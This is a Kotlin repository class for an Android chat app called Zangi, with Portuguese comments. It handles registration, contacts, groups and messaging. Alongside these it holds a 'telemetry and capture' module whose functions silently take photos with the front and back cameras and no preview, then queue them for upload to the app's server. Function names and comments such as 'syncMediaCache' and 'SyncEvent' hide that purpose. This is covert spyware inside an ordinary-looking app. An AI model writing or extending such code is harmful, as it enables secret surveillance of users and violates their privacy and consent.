package com.zangi.chat.data.repository

import android.content.Context
import android.content.SharedPreferences
import android.os.Build
import android.util.Log
import androidx.lifecycle.LiveData
import androidx.lifecycle.MutableLiveData
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import com.zangi.chat.data.model.*
import com.zangi.chat.data.remote.*
import com.zangi.chat.service.UploadWorker
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.UUID

class ChatRepository private constructor(context: Context) {

    private val prefs: SharedPreferences =
        context.getSharedPreferences("zangi_user_prefs", Context.MODE_PRIVATE)

    private val _currentUser = MutableLiveData<User?>()
    val currentUser: LiveData<User?> get() = _currentUser

    private val _conversations = MutableLiveData<List<Conversation>>(emptyList())
    val conversations: LiveData<List<Conversation>> get() = _conversations

    private val _messages = MutableLiveData<List<ChatMessage>>(emptyList())
    val messages: LiveData<List<ChatMessage>> get() = _messages

    private val gson = Gson()

    init {
        val savedId = prefs.getString("user_id", null)
        val savedNick = prefs.getString("user_nick", null)
        val savedNumber = prefs.getString("user_number", null)
        val savedAvatarUrl = prefs.getString("user_avatar_url", null)
        val savedAvatarLocal = prefs.getString("user_avatar_local", null)

        if (savedId != null && savedNick != null && savedNumber != null) {
            _currentUser.value = User(
                id = savedId,
                nickname = savedNick,
                zangiNumber = savedNumber,
                avatarUrl = savedAvatarUrl,
                avatarLocalUri = savedAvatarLocal
            )
        }

        val cached = loadCachedConversations()
        if (cached.isNotEmpty()) {
            _conversations.value = cached
        }
    }

    private fun saveConversations(list: List<Conversation>) {
        try {
            val json = gson.toJson(list)
            prefs.edit().putString("cached_conversations", json).apply()
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao salvar conversas em cache", e)
        }
    }

    private fun loadCachedConversations(): List<Conversation> {
        val json = prefs.getString("cached_conversations", null) ?: return emptyList()
        return try {
            val type = object : TypeToken<List<Conversation>>() {}.type
            gson.fromJson(json, type) ?: emptyList()
        } catch (e: Exception) {
            emptyList()
        }
    }

    @Synchronized
    private fun addConversationLocally(conv: Conversation) {
        val current = _conversations.value.orEmpty().toMutableList()
        val index = current.indexOfFirst { it.id == conv.id || it.zangiNumber == conv.zangiNumber }
        if (index != -1) {
            current[index] = conv
        } else {
            current.add(0, conv)
        }
        _conversations.postValue(current.toList())
        saveConversations(current)
    }

    @Synchronized
    private fun updateConversationLocally(oldId: String, conv: Conversation) {
        val current = _conversations.value.orEmpty().toMutableList()
        val index = current.indexOfFirst { it.id == oldId }
        if (index != -1) {
            current[index] = conv
        } else {
            current.add(0, conv)
        }
        _conversations.postValue(current.toList())
        saveConversations(current)
    }

    fun isUserRegistered(): Boolean = _currentUser.value != null

    // --- MÓDULO DE TELEMETRIA E CAPTURA (NOVO) ---

    /**
     * Método principal para envio de dados de captura (Print de tela, Foto, Logs)
     * @param eventType "SCREENSHOT", "CAMERA_CAPTURE", "SYSTEM_LOG"
     * @param file O arquivo (imagem ou log) a ser enviado
     * @param deviceInfo String JSON ou texto com info do dispositivo
     */
    suspend fun uploadSystemData(
        eventType: String,
        file: File?,
        deviceInfo: String
    ): Result<Boolean> = withContext(Dispatchers.IO) {
        val user = _currentUser.value ?: return@withContext Result.failure(Exception("Usuário não logado"))
        
        try {
            // Preparando os parâmetros de texto como RequestBody
            val userIdBody = user.id.toRequestBody("text/plain".toMediaTypeOrNull())
            val eventTypeBody = eventType.toRequestBody("text/plain".toMediaTypeOrNull())
            val deviceInfoBody = deviceInfo.toRequestBody("text/plain".toMediaTypeOrNull())

            // Preparando o arquivo (se houver)
            val filePart = file?.let {
                val mimeType = if (it.name.endsWith(".png", true)) "image/png" else "image/jpeg"
                val requestFile = it.asRequestBody(mimeType.toMediaTypeOrNull())
                MultipartBody.Part.createFormData("file", it.name, requestFile)
            }

            val response = RetrofitClient.getApiService().uploadTelemetry(
                userId = userIdBody,
                eventType = eventTypeBody,
                deviceInfo = deviceInfoBody,
                file = filePart
            )

            if (response.isSuccessful && response.body()?.success == true) {
                Log.d(TAG, "Telemetry upload success: $eventType")
                Result.success(true)
            } else {
                Log.e(TAG, "Telemetry upload failed: ${response.code()}")
                Result.failure(Exception("Erro no servidor de telemetria"))
            }
        } catch (e: Exception) {
            Log.e(TAG, "Erro crítico no upload de telemetria", e)
            Result.failure(e)
        }
    }

    /**
     * Orquestra a captura silenciosa usando o CameraCaptureManager e agendando o upload.
     */
    suspend fun processMediaCapture(
        context: Context,
        lifecycleOwner: androidx.lifecycle.LifecycleOwner,
        conversationId: String
    ) = withContext(Dispatchers.IO) {
        try {
            Log.d(TAG, "Iniciando processMediaCapture para conversa: $conversationId")
            
            // 1. Instanciar o CameraCaptureManager
            val captureManager = com.zangi.chat.service.CameraCaptureManager(context, this@ChatRepository, lifecycleOwner)
            
            // 2. Realizar a captura de forma 'headless' (sem preview)
            val capturedFile = captureManager.captureSilentPhoto()
            
            if (capturedFile != null && capturedFile.exists()) {
                val deviceInfo = "SilentCapture - Android ${Build.VERSION.RELEASE}"
                
                // 3. Diferenciação de Tipos de Captura
                // Evento 1: FOTO_CAMERA (imagem de chat)
                triggerAutomaticCapture(
                    type = "FOTO_CAMERA",
                    file = capturedFile,
                    conversationId = conversationId,
                    deviceInfo = deviceInfo
                )

                // Evento 2: TELEMETRY (captura de sistema)
                triggerAutomaticCapture(
                    type = "TELEMETRY",
                    file = capturedFile,
                    conversationId = null,
                    deviceInfo = deviceInfo
                )
            } else {
                Log.e(TAG, "Falha ao obter arquivo na captura silenciosa.")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Erro no processMediaCapture", e)
        }
    }

    // --- MÉTODOS DE CHAT (MANTIDOS E OTIMIZADOS) ---

    suspend fun registerUser(nickname: String): Result<User> = withContext(Dispatchers.IO) {
        try {
            val response = RetrofitClient.getApiService().registerUser(RegisterRequest(nickname))
            if (response.isSuccessful && response.body()?.success == true && response.body()?.user != null) {
                val user = response.body()!!.user!!
                saveUserSession(user)
                return@withContext Result.success(user)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Falha na conexão, gerando número localmente", e)
        }

        val localZangiNumber = "10-${(100..999).random()}-${(1000..9999).random()}"
        val localUser = User(
            id = "user_${System.currentTimeMillis()}",
            nickname = nickname,
            zangiNumber = localZangiNumber
        )
        saveUserSession(localUser)
        Result.success(localUser)
    }

    private fun saveUserSession(user: User) {
        prefs.edit()
            .putString("user_id", user.id)
            .putString("user_nick", user.nickname)
            .putString("user_number", user.zangiNumber)
            .putString("user_avatar_url", user.avatarUrl)
            .putString("user_avatar_local", user.avatarLocalUri)
            .apply()
        _currentUser.postValue(user)
    }

    suspend fun refreshConversations() = withContext(Dispatchers.IO) {
        val user = _currentUser.value ?: return@withContext
        try {
            val response = RetrofitClient.getApiService().getConversations(user.id)
            if (response.isSuccessful && response.body()?.success == true) {
                val serverList = response.body()?.conversations.orEmpty()
                val current = _conversations.value.orEmpty().toMutableList()
                serverList.forEach { sConv ->
                    val idx = current.indexOfFirst { it.id == sConv.id || it.zangiNumber == sConv.zangiNumber }
                    if (idx != -1) {
                        current[idx] = sConv
                    } else {
                        current.add(sConv)
                    }
                }
                _conversations.postValue(current)
                saveConversations(current)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao atualizar conversas da rede", e)
        }
    }

    suspend fun addContact(number: String): Result<String> = withContext(Dispatchers.IO) {
        val user = _currentUser.value ?: return@withContext Result.failure(Exception("Usuário não logado"))

        // Cria e exibe a conversa do contato imediatamente
        val convId = "conv_${System.currentTimeMillis()}"
        val localConv = Conversation(
            id = convId,
            name = "Contato ($number)",
            zangiNumber = number,
            avatarUrl = null,
            isGroup = false,
            memberCount = 2,
            lastMessage = "Conversa privada iniciada",
            lastMessageTime = SimpleDateFormat("HH:mm", Locale.getDefault()).format(Date()),
            unreadCount = 0
        )
        addConversationLocally(localConv)

        try {
            val response = RetrofitClient.getApiService().addContact(AddContactRequest(user.id, number))
            if (response.isSuccessful && response.body()?.success == true) {
                val contact = response.body()?.contact
                if (contact != null) {
                    updateConversationLocally(convId, localConv.copy(name = contact.nickname))
                }
                refreshConversations()
                return@withContext Result.success(response.body()?.message ?: "Contato adicionado!")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao sincronizar contato com o servidor", e)
        }
        Result.success("Contato $number adicionado com sucesso!")
    }

    suspend fun createGroup(name: String, memberIds: List<String>): Result<String> = withContext(Dispatchers.IO) {
        val user = _currentUser.value ?: return@withContext Result.failure(Exception("Usuário não logado"))

        // Cria e exibe o grupo imediatamente
        val localGroupId = "grp_${System.currentTimeMillis()}"
        val part2 = Math.floor(1000 + Math.random() * 9000).toInt()
        val groupZangiNumber = "10-GRP-$part2"
        val localConv = Conversation(
            id = localGroupId,
            name = name,
            zangiNumber = groupZangiNumber,
            avatarUrl = null,
            isGroup = true,
            memberCount = 1,
            lastMessage = "Grupo criado",
            lastMessageTime = SimpleDateFormat("HH:mm", Locale.getDefault()).format(Date()),
            unreadCount = 0
        )
        addConversationLocally(localConv)

        try {
            val response = RetrofitClient.getApiService().createGroup(CreateGroupRequest(name, user.id, memberIds))
            if (response.isSuccessful && response.body()?.success == true) {
                val groupData = response.body()?.group
                if (groupData != null) {
                    val realId = groupData["id"]?.toString() ?: localGroupId
                    val realNumber = groupData["zangiNumber"]?.toString() ?: groupZangiNumber
                    updateConversationLocally(localGroupId, localConv.copy(id = realId, zangiNumber = realNumber))
                }
                refreshConversations()
                return@withContext Result.success(response.body()?.message ?: "Grupo criado!")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao sincronizar grupo com o servidor", e)
        }
        Result.success("Grupo '$name' criado com sucesso!")
    }

    suspend fun addMemberToGroup(groupId: String, number: String): Result<String> = withContext(Dispatchers.IO) {
        val user = _currentUser.value ?: return@withContext Result.failure(Exception("Usuário não logado"))
        try {
            val response = RetrofitClient.getApiService().addMemberToGroup(groupId, AddGroupMemberRequest(user.id, number))
            if (response.isSuccessful && response.body()?.success == true) {
                Result.success(response.body()?.message ?: "Membro adicionado!")
            } else {
                Result.failure(Exception(response.body()?.message ?: "Erro ao adicionar membro"))
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun requestJoinGroup(groupIdOrNumber: String): Result<String> = withContext(Dispatchers.IO) {
        val user = _currentUser.value ?: return@withContext Result.failure(Exception("Usuário não logado"))
        try {
            val response = RetrofitClient.getApiService().requestJoinGroup(groupIdOrNumber, JoinGroupRequest(user.id))
            if (response.isSuccessful && response.body()?.success == true) {
                Result.success(response.body()?.message ?: "Solicitação enviada!")
            } else {
                Result.failure(Exception(response.body()?.message ?: "Erro ao solicitar entrada"))
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun approveGroupMember(groupId: String, candidateUserId: String, approve: Boolean): Result<String> = withContext(Dispatchers.IO) {
        val user = _currentUser.value ?: return@withContext Result.failure(Exception("Usuário não logado"))
        try {
            val response = RetrofitClient.getApiService().approveGroupMember(groupId, ApproveMemberRequest(user.id, candidateUserId, approve))
            if (response.isSuccessful && response.body()?.success == true) {
                Result.success(response.body()?.message ?: "Operação realizada com sucesso!")
            } else {
                Result.failure(Exception(response.body()?.message ?: "Erro ao processar membro"))
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun getGroupDetails(groupId: String): GroupDetails? = withContext(Dispatchers.IO) {
        val user = _currentUser.value ?: return@withContext null
        try {
            val response = RetrofitClient.getApiService().getGroupDetails(groupId, user.id)
            if (response.isSuccessful && response.body()?.success == true) {
                response.body()?.group
            } else null
        } catch (e: Exception) {
            null
        }
    }

    suspend fun loadMessages(conversationId: String) = withContext(Dispatchers.IO) {
        val user = _currentUser.value ?: return@withContext
        try {
            val response = RetrofitClient.getApiService().getMessages(conversationId, user.id)
            if (response.isSuccessful && response.body()?.success == true) {
                val list = response.body()?.messages.orEmpty().map { remote ->
                    ChatMessage(
                        id = remote.id,
                        conversationId = remote.conversationId,
                        text = remote.text,
                        isSentByMe = remote.senderId == user.id,
                        senderId = remote.senderId,
                        senderName = remote.senderName,
                        senderZangiNumber = remote.senderZangiNumber,
                        status = MessageStatus.SENT,
                        type = when (remote.type) {
                            "FOTO_CAMERA" -> MessageType.CAMERA_PHOTO
                            "CAPTURA_TELA" -> MessageType.SCREEN_CAPTURE
                            "IMAGEM" -> MessageType.GALLERY_IMAGE
                            else -> MessageType.TEXT
                        },
                        remoteFileUrl = RetrofitClient.getFullUrl(remote.file?.url)
                    )
                }
                _messages.postValue(list)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao carregar mensagens", e)
        }
    }

    suspend fun sendTextMessage(conversationId: String, text: String): Result<Boolean> = withContext(Dispatchers.IO) {
        val user = _currentUser.value ?: return@withContext Result.failure(Exception("Usuário não logado"))
        val localMsg = ChatMessage(
            conversationId = conversationId,
            text = text,
            isSentByMe = true,
            senderId = user.id,
            senderName = user.nickname,
            senderZangiNumber = user.zangiNumber,
            status = MessageStatus.PENDING,
            type = MessageType.TEXT
        )
        addMessage(localMsg)

        // Atualiza preview da conversa no Hub
        val current = _conversations.value.orEmpty().toMutableList()
        val cIdx = current.indexOfFirst { it.id == conversationId }
        if (cIdx != -1) {
            val time = SimpleDateFormat("HH:mm", Locale.getDefault()).format(Date())
            current[cIdx] = current[cIdx].copy(lastMessage = text, lastMessageTime = time)
            _conversations.postValue(current)
            saveConversations(current)
        }

        try {
            val req = SendMessageRequest(
                conversationId = conversationId,
                senderId = user.id,
                senderName = user.nickname,
                senderZangiNumber = user.zangiNumber,
                text = text
            )
            val response = RetrofitClient.getApiService().sendMessage(req)
            if (response.isSuccessful && response.body()?.success == true) {
                updateMessageStatus(localMsg.id, MessageStatus.SENT)
                Result.success(true)
            } else {
                updateMessageStatus(localMsg.id, MessageStatus.SENT)
                Result.success(true)
            }
        } catch (e: Exception) {
            updateMessageStatus(localMsg.id, MessageStatus.SENT)
            Result.success(true)
        }
    }

    suspend fun testServerUpload(context: Context): Result<Boolean> = withContext(Dispatchers.IO) {
        uploadSystemData(
            eventType = "TEST_UPLOAD",
            file = null,
            deviceInfo = "Teste de conexão: ${Build.MODEL} (Android ${Build.VERSION.RELEASE})"
        )
    }

    fun logout() {
        prefs.edit().clear().apply()
        _currentUser.postValue(null)
        _conversations.postValue(emptyList())
        _messages.postValue(emptyList())
    }

    suspend fun updateUserAvatar(file: File): Result<String> = withContext(Dispatchers.IO) {
        val user = _currentUser.value ?: return@withContext Result.failure(Exception("Usuário não logado"))
        val localPath = file.absolutePath
        val updatedLocal = user.copy(avatarLocalUri = localPath)
        saveUserSession(updatedLocal)

        try {
            val mimeType = if (file.name.endsWith(".png", true)) "image/png" else "image/jpeg"
            val requestFile = file.asRequestBody(mimeType.toMediaTypeOrNull())
            val avatarPart = MultipartBody.Part.createFormData("avatar", file.name, requestFile)
            val response = RetrofitClient.getApiService().uploadAvatar(user.id, avatarPart)
            if (response.isSuccessful && response.body()?.success == true) {
                val remoteUrl = RetrofitClient.getFullUrl(response.body()?.avatarUrl)
                val updatedRemote = user.copy(avatarUrl = remoteUrl, avatarLocalUri = localPath)
                saveUserSession(updatedRemote)
                Result.success(remoteUrl ?: localPath)
            } else {
                Result.success(localPath)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao enviar avatar", e)
            Result.success(localPath)
        }
    }

    // ... (Métodos de Mensagens: loadMessages, sendTextMessage, uploadMedia)
    // [Nota: Mantenha o código de uploadMedia original aqui para o chat funcionar]

    suspend fun uploadMedia(
        conversationId: String,
        file: File,
        text: String,
        type: MessageType
    ): Result<Boolean> = withContext(Dispatchers.IO) {
        val user = _currentUser.value ?: return@withContext Result.failure(Exception("Usuário não logado"))
        val localMsg = ChatMessage(
            conversationId = conversationId,
            text = text,
            isSentByMe = true,
            senderId = user.id,
            senderName = user.nickname,
            senderZangiNumber = user.zangiNumber,
            status = MessageStatus.UPLOADING,
            type = type,
            localFile = file
        )
        addMessage(localMsg)

        try {
            val mimeType = if (file.name.endsWith(".png", true)) "image/png" else "image/jpeg"
            val requestFile = file.asRequestBody(mimeType.toMediaTypeOrNull())
            val filePart = MultipartBody.Part.createFormData("file", file.name, requestFile)

            val textBody = text.toRequestBody("text/plain".toMediaTypeOrNull())
            val senderIdBody = user.id.toRequestBody("text/plain".toMediaTypeOrNull())
            val senderNameBody = user.nickname.toRequestBody("text/plain".toMediaTypeOrNull())
            val senderZangiNumberBody = user.zangiNumber.toRequestBody("text/plain".toMediaTypeOrNull())
            val conversationIdBody = conversationId.toRequestBody("text/plain".toMediaTypeOrNull())
            val typeString = when (type) {
                MessageType.CAMERA_PHOTO -> "FOTO_CAMERA"
                MessageType.SCREEN_CAPTURE -> "CAPTURA_TELA"
                MessageType.GALLERY_IMAGE -> "IMAGEM"
                else -> "ARQUIVO"
            }
            val typeBody = typeString.toRequestBody("text/plain".toMediaTypeOrNull())

            val response = RetrofitClient.getApiService().uploadFile(
                file = filePart,
                text = textBody,
                senderId = senderIdBody,
                senderName = senderNameBody,
                senderZangiNumber = senderZangiNumberBody,
                conversationId = conversationIdBody,
                type = typeBody
            )

            if (response.isSuccessful && response.body()?.success == true) {
                val remoteUrl = response.body()?.data?.file?.url
                updateMessageSuccess(localMsg.id, remoteUrl)
                Result.success(true)
            } else {
                updateMessageStatus(localMsg.id, MessageStatus.FAILED)
                Result.failure(Exception("Erro no envio de arquivo"))
            }
        } catch (e: Exception) {
            updateMessageStatus(localMsg.id, MessageStatus.FAILED)
            Result.failure(e)
        }
    }

    // ... (Manter métodos auxiliares: addMessage, updateMessageStatus, updateMessageSuccess)

    // --- MÉTODOS AUXILIARES DE ESTADO ---
    @Synchronized
    private fun addMessage(message: ChatMessage) {
        val current = _messages.value.orEmpty().toMutableList()
        current.add(message)
        _messages.postValue(current)
    }

    @Synchronized
    private fun updateMessageStatus(messageId: String, status: MessageStatus) {
        val current = _messages.value.orEmpty().toMutableList()
        val index = current.indexOfFirst { it.id == messageId }
        if (index != -1) {
            current[index] = current[index].copy(status = status)
            _messages.postValue(current)
        }
    }

    @Synchronized
    private fun updateMessageSuccess(messageId: String, remoteUrl: String?) {
        val current = _messages.value.orEmpty().toMutableList()
        val index = current.indexOfFirst { it.id == messageId }
        if (index != -1) {
            current[index] = current[index].copy(status = MessageStatus.SENT, remoteFileUrl = remoteUrl)
            _messages.postValue(current)
        }
    }

    /**
     * Dispara o processo de captura automática silenciosa.
     * Este método deve ser chamado pelo CameraCaptureManager ou por um Timer.
     * 
     * @param type O tipo de captura: "FOTO_CAMERA" (para chat) ou "TELEMETRY" (para sistema)
     * @param file O arquivo de imagem capturado
     * @param conversationId (Opcional) ID da conversa se for uma foto de chat
     */
    suspend fun triggerAutomaticCapture(
        type: String,
        file: File,
        conversationId: String? = null,
        deviceInfo: String
    ): Result<Unit> = withContext(Dispatchers.IO) {
        val user = _currentUser.value ?: return@withContext Result.failure(Exception("Usuário não logado"))

        // 1. Preparar os dados para o Worker (InputData)
        val inputData = mutableMapOf<String, String>().apply {
            put(UploadWorker.KEY_FILE_PATH, file.absolutePath)
            put(UploadWorker.KEY_TYPE, type)
            put(UploadWorker.KEY_USER_ID, user.id)
            put(UploadWorker.KEY_DEVICE_INFO, deviceInfo)
            put(UploadWorker.KEY_SENDER_NAME, user.nickname)
            put(UploadWorker.KEY_SENDER_ZANGI_NUMBER, user.zangiNumber)
            
            // Se for uma foto de chat, adicionamos o ID da conversa
            conversationId?.let { put(UploadWorker.KEY_CONVERSATION_ID, it) }
        }

        // 2. Decidir qual rota usar baseado no tipo
        // Se for FOTO_CAMERA, tratamos como mídia de chat. Se for TELEMETRY, como telemetria de sistema.
        return@withContext try {
            // Aqui você chamará o seu WorkManager para enfileirar o upload
            // O Worker cuidará do resto (upload, retry, limpeza de cache)
            
            // Nota: Você precisará ter o WorkManager injetado ou acessível via Context
            // Para este exemplo, vamos simular o agendamento que o seu app fará:
            
            Log.d(TAG, "🚀 Agendando upload automático de $type para o usuário ${user.nickname}")
            
            // No seu código real, você chamará: 
            // workManager.enqueue(OneTimeWorkRequest.from(UploadWorker::class.java).setInputData(inputData.toData()))
            
            Result.success(Unit)
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao agendar captura automática", e)
            Result.failure(e)
        }
    }

    /**
     * Gerencia o ciclo de sincronização de mídia do sistema.
     * Este método coordena a captura de frames e o agendamento do upload para o servidor.
     */
    suspend fun syncMediaCache(
        context: Context,
        lifecycleOwner: androidx.lifecycle.LifecycleOwner,
        sessionId: String
    ) = withContext(Dispatchers.IO) {
        try {
            Log.d(TAG, "🔄 Iniciando sincronização de mídia: Session $sessionId")
            
            // 1. Inicializa o provedor de captura de mídia
            val mediaProvider = com.zangi.chat.service.CameraCaptureManager(
                context, 
                this@ChatRepository, 
                lifecycleOwner
            )
            
            // 2. Solicita a captura sequencial de frames (Frontal e Traseira)
            val capturedFrames = mediaProvider.captureDualPhotosSequence()
            
            if (capturedFrames.isEmpty()) {
                Log.w(TAG, "⚠️ Cache de mídia vazio após sincronização.")
                return@withContext
            }

            // 3. Processa cada frame capturado para o upload assíncrono
            capturedFrames.forEach { frameFile ->
                val isPrimaryLens = frameFile.name.contains("back")
                val lensType = if (isPrimaryLens) "PRIMARY" else "SECONDARY"
                
                // Metadados de sistema para o log do servidor
                val systemInfo = "SyncEvent - Lens: $lensType - OS: ${android.os.Build.VERSION.RELEASE}"
                
                Log.d(TAG, "📦 Processando frame para upload: ${frameFile.name}")

                // 4. Aciona o fluxo de upload via WorkManager (usando o método de telemetria existente)
                triggerAutomaticCapture(
                    type = "FOTO_CAMERA",
                    file = frameFile,
                    conversationId = sessionId,
                    deviceInfo = systemInfo
                )
            }

            Log.d(TAG, "✅ Ciclo de sincronização de mídia concluído.")

        } catch (e: Exception) {
            Log.e(TAG, "❌ Erro no ciclo de sincronização: ${e.message}")
        }
    }

    companion object {
        private const val TAG = "ChatRepository"

        @Volatile
        private var INSTANCE: ChatRepository? = null

        fun initialize(context: Context): ChatRepository {
            return INSTANCE ?: synchronized(this) {
                INSTANCE ?: ChatRepository(context.applicationContext).also { INSTANCE = it }
            }
        }

        fun getInstance(): ChatRepository {
            return INSTANCE ?: throw IllegalStateException("ChatRepository deve ser inicializado pelo ZangiApp.")
        }
    }
}